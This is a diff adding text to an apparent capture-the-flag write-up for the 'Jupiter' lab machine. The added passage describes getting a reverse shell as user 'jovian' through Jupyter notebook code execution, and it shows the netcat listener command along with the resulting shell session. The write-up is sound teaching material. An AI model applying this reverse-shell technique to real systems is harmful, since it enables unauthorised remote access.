@@ -622,10 +622,39 @@ To do it, we click on `"New"` and then `"Python 3 (ipykernel)"`.
 
 <br />
 
-Finally, we can validate the `command execution` writing a simply code and clicking on `"Run"`:
+Finally, we can validate the `command execution` by writing a simply code like this and clicking on `"Run"`:
 
 <br />
 
 ![16](../../../assets/images/Jupiter/16.png)
+
+<br />
+
+Perfect! We are executing commands as `jovian`, so we will also gain access as that user. 
+
+To do it we are going to run a `reverse shell`:
+
+<br />
+
+
+
+<br />
+
+Check the listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.31] from (UNKNOWN) [10.10.11.216] 59648
+bash: cannot set terminal process group (3075): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+jovian@jupiter:/opt/solar-flares$ id
+uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science)
+```
 
 <br />
